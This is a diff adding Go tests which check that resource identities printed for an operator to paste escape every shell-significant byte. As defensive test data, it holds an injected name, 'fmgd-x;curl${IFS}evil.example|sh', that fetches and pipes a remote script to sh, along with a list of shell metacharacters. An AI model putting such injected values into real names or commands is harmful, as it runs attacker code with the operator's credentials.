@@ -7,6 +7,7 @@ import (
 	"testing"
 
 	"github.com/dimipaun/fugaro/internal/safetext"
+	"github.com/dimipaun/fugaro/internal/shellword"
 )
 
 // The identity of the object a removal takes away (design §6 item 5, plan Task
@@ -480,6 +481,91 @@ func TestTheAPIKeyIdentityBindsItsUIDAndNotItsNameDerivedID(t *testing.T) {
 	}
 }
 
+// TestAnIdentityHoldsNoByteAShellWouldRead: the identity is printed BARE — it
+// cannot be quoted, because what a refusal prints is what fugaro allow-delete
+// compares byte for byte — and the sentence around it tells its reader to copy
+// it into a command line. A plan is a document someone else's session may have
+// written and the managed cover's name rule is a prefix (managed_cover.go), so
+// an object whose name is "fmgd-x;curl${IFS}evil.example|sh" reaches a refusal,
+// and an identity printed with those bytes in it is a command the shell of
+// whoever pastes it runs — with the operator's own credentials, which are the
+// ones fugaro allow-delete writes the owner's list with. So the bytes a shell
+// reads in some way of its own are escaped out of the printed text
+// (identityValue), and what is left is one word no shell rewrites.
+//
+// shellReads is the literal list of bytes a shell reads in a way of its own
+// and an identity therefore prints raw none of: the separators and the pipe,
+// the redirections and the ampersand, the substitution and the quote
+// characters, the glob characters and the braces, the comment, the history
+// expansion and the tilde. A space and a backslash are deliberately not in it:
+// the encoding writes both itself — one space between two parts, and a
+// backslash to introduce an escape — and neither of them can begin, end or
+// continue a command the way these can.
+const shellReads = ";|&<>{}[]*?$`'\"#!~"
+
+// TestAnIdentityHoldsNoByteAShellWouldRead: the identity is printed BARE — it
+// cannot be quoted, because what a refusal prints is what fugaro allow-delete
+// compares byte for byte — and the sentence around it tells its reader to copy
+// it into a command line. The parts it carries are the plan's own, a document
+// someone else's session may have written, and the cover does not read all of
+// them (a bucket object's own name is not the attribute its name rule checks:
+// TestManagedCoverRefusalOfAShellCommandNameIsPasteable is that end), so an
+// identity may hold "fmgd-x;curl${IFS}evil.example|sh" in it. Printed raw, that
+// is a command the shell of whoever pastes it runs — with the operator's own
+// credentials, which are the ones fugaro allow-delete writes the owner's list
+// with. So the bytes a shell reads are escaped out of the printed text
+// (identityValue), and what is left is a line whose only shell-read bytes are
+// the encoding's own two.
+//
+// The two sets are pinned from both ends and not against each other: this test
+// holds that every byte an identity prints raw is one shellword.SafeByte
+// accepts, and internal/shellword's own test holds that set against a literal
+// list of the bytes a shell reads. A single oracle for both would agree with
+// itself about a byte that is wrong in the one place the set is written.
+func TestAnIdentityHoldsNoByteAShellWouldRead(t *testing.T) {
+	// The name from the review, byte for byte: a separator, a substitution, a
+	// pipe, a brace expansion and a comment, in one string a plan may carry.
+	const hostile = `fmgd-x;curl${IFS}evil.example|sh`
+	rc := removal("google_storage_bucket", bucketBefore(hostile, "2026-01-02T03:04:05Z"))
+	id := RemovedIdentity(rc)
+	if !id.Identifies() {
+		t.Fatalf("a bucket named %q identifies nothing: %s", hostile, id.notIdentified())
+	}
+	text := RemoveIdentityText(rc)
+	if got := strings.ContainsAny(text, shellReads); got {
+		t.Errorf("the printed identity %q holds a byte a shell reads, so a reader pasting it runs a command of the plan's choosing", text)
+	}
+	// And the identity is still whole: the escaping moves the bytes, it does
+	// not drop them, so what the refusal printed is what an entry holds and
+	// approves the removal.
+	if pasted := (DeleteEntry{Address: rc.Address, Before: text}); !strings.Contains(text, `fmgd-x\x3bcurl\x24\x7bIFS\x7devil.example\x7csh`) {
+		t.Errorf("the printed identity %q does not carry the name escaped as its bytes", text)
+	} else if ok, why := Approves([]DeleteEntry{pasted}, rc); !ok {
+		t.Errorf("an entry holding the identity the refusal printed does not approve the removal: %s", why)
+	}
+
+	// Every byte of the range, one at a time in each part, and not only the
+	// bytes a reader would list: an identity prints raw only what
+	// shellword.SafeByte accepts — printable ASCII and no other byte — beside
+	// the single space between two parts and the backslash of an escape.
+	for b := 0; b < 256; b++ {
+		for _, ident := range []RemovalIdentity{
+			{Type: "t", Project: "a" + string(rune(b)) + "b", Name: "n", ID: "i", Instance: "x"},
+			{Type: "t", Name: "a" + string(rune(b)) + "b"},
+			{Type: "t", ID: "a" + string(rune(b)) + "b"},
+		} {
+			got := ident.String()
+			for i := 0; i < len(got); i++ {
+				if c := got[i]; c == ' ' || c == '\\' {
+					continue
+				} else if !shellword.SafeByte(c) {
+					t.Errorf("%q holds byte %#x (%q) raw, which a shell reads in a way of its own", got, b, c)
+				}
+			}
+		}
+	}
+}
+
 // TestThePrintedIdentityIsTheIdentityAnEntryHolds: the loop a refusal starts —
 // refusal → the owner copies the identity → fugaro allow-delete → the next
 // plan passes — closes only when the text a sentence prints is BYTE FOR BYTE
@@ -507,6 +593,10 @@ func TestThePrintedIdentityIsTheIdentityAnEntryHolds(t *testing.T) {
 		{"a name that ends in a space", "fmgd-data "},
 		{"a name that starts with a space", " fmgd-data"},
 		{"a name of spaces", "   "},
+		// A name a shell would run a command out of, which the cover's prefix
+		// rule admits (TestAnIdentityHoldsNoByteAShellWouldRead is the rule
+		// about it; this row is the loop the paste closes, on that name).
+		{"a shell command", `fmgd-x;curl${IFS}evil.example|sh`},
 		{"a long name", "fmgd-" + strings.Repeat("x", 300)},
 	} {
 		t.Run(tc.what, func(t *testing.T) {
@@ -579,6 +669,7 @@ func TestAnIdentityIsOnePrintableLineWithSingleSpaces(t *testing.T) {
 	values := []string{
 		"", "a", " a", "a ", " ", "   ", "a b", "a  b", "\ta", "a\t", "a\n", "\r", "\\", "a\\ b", "\\ ", "a\\b",
 		"(", ")", "(a)", "a)", "b(a", "((", "))",
+		";", "$(id)", "a|b", "a&b", "a<b>c", "a{b}", "a*b", "a?b", "a[0]", "a~b", "a!b", "it's", `a"b`, "a#b", "a`b",
 	}
 	for _, v := range values {
 		ids := []RemovalIdentity{
